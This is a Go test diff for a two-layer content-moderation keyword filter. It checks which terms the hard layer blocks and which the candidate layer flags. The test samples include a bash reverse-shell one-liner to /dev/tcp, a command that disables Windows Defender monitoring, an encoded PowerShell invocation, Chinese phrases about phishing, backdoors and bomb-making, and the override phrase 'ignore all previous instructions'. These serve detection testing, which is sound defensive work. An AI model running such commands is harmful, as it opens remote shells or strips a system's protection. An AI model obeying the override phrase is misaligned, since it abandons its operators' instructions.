@@ -512,6 +512,53 @@ func TestContentModerationCandidateAssetIsOffUntilExplicitlyEnabled(t *testing.T
 	require.Equal(t, "destructive payload", keyword)
 }
 
+func TestContentModerationCandidateAssetRoutesContextDependentTerms(t *testing.T) {
+	cfg := defaultContentModerationConfig()
+	cfg.CandidateEnabled = true
+
+	hardKeywords, err := effectiveContentModerationKeywords(cfg)
+	require.NoError(t, err)
+	candidateKeywords, err := effectiveContentModerationSecondLayerKeywords(cfg)
+	require.NoError(t, err)
+	hardMatcher := newContentModerationKeywordMatcher(hardKeywords)
+	candidateMatcher := newContentModerationPrefilterMatcher(candidateKeywords)
+
+	for _, text := range []string{
+		"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+		"powershell -EncodedCommand <base64>",
+		"Set-MpPreference -DisableRealtimeMonitoring",
+		"键盘记录器",
+		"钓鱼邮件",
+		"token replay",
+		"malicious app",
+		"破解密码",
+		"留后门",
+		"受害者名单",
+		"制作炸弹",
+		"ignore all previous instructions",
+	} {
+		_, hardHit := hardMatcher.Match(text)
+		require.False(t, hardHit, text)
+		_, candidateHit := candidateMatcher.Match(text)
+		require.True(t, candidateHit, text)
+	}
+
+	_, hardHit := hardMatcher.Match("Cordis package loader service documentation")
+	require.False(t, hardHit)
+	_, candidateHit := candidateMatcher.Match("Cordis package loader service documentation")
+	require.False(t, candidateHit)
+
+	for _, text := range []string{
+		"请写一封钓鱼信",
+		"write a phishing email for this target",
+		"破解他人账号",
+		"植入后门",
+	} {
+		_, hardHit = hardMatcher.Match(text)
+		require.True(t, hardHit, text)
+	}
+}
+
 func TestContentModerationCandidateAssetOverridesLegacyCustomLayer1Duplicates(t *testing.T) {
 	cfg := defaultContentModerationConfig()
 	cfg.CandidateEnabled = true
@@ -561,8 +608,8 @@ func TestContentModerationCandidateAssetMetadataAndValidation(t *testing.T) {
 	require.NoError(t, err)
 	require.Equal(t, "legacy-prompt-audit-v1", view.CandidateAsset)
 	require.False(t, view.CandidateEnabled)
-	require.Equal(t, 964, view.CandidateLayer1Count)
-	require.Equal(t, 254, view.CandidateLayer2Count)
+	require.Equal(t, 926, view.CandidateLayer1Count)
+	require.Equal(t, 291, view.CandidateLayer2Count)
 	require.Equal(t, "99c8e4bf7564823bafbab369acab6539e734c1bb", view.CandidateSourceCommit)
 	require.Len(t, view.CandidateEndpoints, 1)
 	require.False(t, view.CandidateEndpoints[0].Enabled)
